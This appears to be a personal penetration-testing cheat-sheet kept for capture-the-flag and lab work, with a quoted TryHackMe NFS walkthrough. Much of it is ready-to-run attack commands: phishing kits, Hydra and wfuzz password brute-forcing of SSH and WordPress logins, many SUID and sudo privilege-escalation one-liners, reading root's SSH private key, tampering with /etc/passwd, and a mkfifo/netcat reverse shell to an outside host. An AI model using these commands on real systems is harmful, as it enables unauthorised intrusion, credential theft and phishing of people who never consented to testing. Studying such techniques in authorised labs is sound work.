# Notes

WhatsApp phishing cd QRLJacking/QRLJacker python3 QrlJacker.py

Scanning Vulnerabilitites cd routersploit\
python3 rsf.py

Phishing cd QRLJacking/QRLJacker/zphisher bash zphisher.sh

Nessus vulnerablity scanner sudo /bin/systemctl start nessusd.service https://192.168.29.38:8834/

OpenVas sudo docker ps -a\
sudo docker start f7b4f8e569b4\
https://127.0.0.1 admin:admin

Proxy Tor sudo service tor start proxychains firefox\
sudo service tor stop

Hetty sudo docker run -v $HOME/.hetty:/root/.hetty -p 8081:8081 dstotijn/hetty localhost:8080

Social EngineerinG Toolkit sudo setoolkit

Anonsurf sudo anonsurf start

Shodan

threader3000 Port Scanner

dirsearch Scanning directories in websites cd tools/dirsearch python3 dirsearch.py -u http://websitename.com -e all

wpscan test the security of their sites.

ps command used to see servers shut down port fuser -k 8888/tcp

Hydra for password cracking ssh hydra -l jan -P rockyou.txt ssh://10.10.66.123 jan is the username

Sending a file to ssh server scp limpeas.sh jan@10.10.66.123:/dev/shm

Htb sudo sysctl net.ipv6.conf.all.disable\_ipv6=0

nmap nmap -vv -sV -sC -p- -Pn -T4 --max-retries 0 nmap -sV -p- -Pn -T4 --max-retries 0

dirb http://dynstr.htb/nic/

Extracting from image

* steghide extract -sf forest.jpg
* binwalk img.jpg \[-e to extract the hidden files]
* exiftool img.jpg

tools turbodecoder cd dist java -jar turbodecoder.jar

Nikto ifconfig to find your ip address eth0 inet address ipcalc on ipaddress to find range network: gives iprange to scan Use nmap nmap -p 80 network/range -oG file\_to\_store\_in.txt cat file\_to\_store\_in.txt shows the result of nmap scan cat nullbyte.txt | awk '/Up$/{print $2}' | cat >> target.ip.txt //stores all the target ip addresses in target\_ip.txt nikto -h target\_ip.txt //runs nikto scan on ipaddresses gained through nmap nikto -h {ipadd} -Format msf+ //runs scripts agiainst the present vulnerabilities

searchsploit version

Killing a port sudo netstat -ntupl sudo kill {PID}

Checking file permissions getcap -r / 2>/dev/null

Gaining root access

1. Using python to gain root /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
2. /usr/bin/gdb /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
3. cpulimit suid abuse cpulimit -l 100 -f -- /bin/sh -p

4\)Using a .sh file that executes after a specific interval echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.248 4444 >/tmp/f" > filename.sh start a shell at 4444 ti listen for it nc -lvp 4444

1. (root) NOPASSWD: /usr/bin/find sudo find . -exec /bin/sh ; -quit

6\)using nmap nmap --interactive !sh

7\)using /usr/bin/base32 get the private key pf root using base32 "/root/.ssh/id\_rsa" | base32 --decode

8\)VulHub Solstice priv extraction

ps aux ls -l /var/tmp/sv echo "" > /var/tmp/sv/index.php curl localhost:57 ls -l /usr/bin/find find . -exec /bin/bash -p ; -quit

9\)MYsql sudo mysql -e '! /bin/sh' id

1. /usr/bin/bash -p

11\)/usr/bin/php7.2 /usr/bin/php7.2 -r "pcntl\_exec('/bin/bash', \['-p']);"

12\)sql3 sudo -u#-1 sqlite3 /dev/null ‘.shell /bin/bash’

find privilages for priv. ext find / -type f -perm -4000 2>/dev/null find /etc -type f -writable 2> /dev/null find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2> /dev/null

13\)Screen screen -x root/root

14\)wget ||HAHOWDY copy the etc/passwd file generate a new user and add it to copied file on local machine use wget on host machine to get the passwd file su the newly maed user

NFS

Now that we have discovered an NFS service is listening, let’s check what files are being shared. We can do this using the command showmount. In the terminal below, we run showmount -e 10.10.111.175. The -e or --exports show the NFS server’s export list.

Pentester Terminal pentester@TryHackMe$ showmount -e 10.10.111.175 Export list for 10.10.111.175: /share (everyone) /my-notes (noone) As we can see in the terminal output above, we have two shares, /share and /my-notes. After you have started the attached machine, use the AttackBox terminal to discover the shares on 10.10.111.175.

Let’s try to mount the shares we have discovered. We can create a directory on the AttackBox using mkdir tmp1, where tmp1 is the directory’s name. Then we can use this directory we created to mount the public NFS share using: mount 10.10.111.175:/my-notes tmp1.

Pentester Terminal pentester@TryHackMe$ mount 10.10.111.175:/my-notes tmp1 mount.nfs: access denied by server while mounting 10.10.111.175:/my-notes We can see that the mounting has failed. my-notes is not public and requires specific authentication mechanisms that we don’t have access to. Let’s try again with the other folder, share.

Pentester Terminal pentester@TryHackMe$ mount 10.10.111.175:/share tmp1 We didn’t get any error messages, so it was a success. Let’s go inside the share to see what’s inside it using cd tmp1, then ls.

Pentester Terminal pentester@TryHackMe$ ls 132-0.txt 2680-0.txt There are two text files. We can open the file using any text editor such as nano FILENAME or something quicker such as less FILENAME

Emumerating Run ifconfig and get the ip address Run ipcalc to get the ip range Run sudo netdiscover -r 192.168.1.0/24 to get list of devices present

Cron jobs cat /etc/crontab

History cat \~/.\*history | less

export TERM=xterm-color python -c 'import pty; pty.spawn("/bin/sh")' python3 -c 'import pty; pty.spawn("/bin/sh")' Ctrl+Z stty raw -echo; fg export SHELL=bash export TERM=xterm stty rows 50 cols 236

check for rows and colums stty -a

mysql -h 10.0.2.26 -u seeddms -p password on the next line

dirb http://10.0.2.27 /usr/share/wordlists/dirb/big.txt

wpscan --url 10.10.11.125 --enumerate p,u --plugins-detection aggressive wpscan --url http://10.11.1.251/wp/wp-login.php -P /home/kali/Desktop/rockyou.txt -U Admin

Enumeration for subdomains ffuf -u http://shibboleth.htb -w \~/Desktop/Ctf/Shells/Top100subdomains.txt -H "Host: FUZZ.shibboleth.htb" -mc 200

wfuzz -w /usr/share/wordlists/rockyou.txt -c -d "log=admin\&pwd=FUZZ" http://10.11.1.251/wp/wp-login.php wfuzz -w /usr/share/wordlists/rockyou.txt -c --hw 254 -d "log=admin\&pwd=FUZZ" http://10.11.1.251/wp/wp-login.php

Whatweb

Linpeas wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
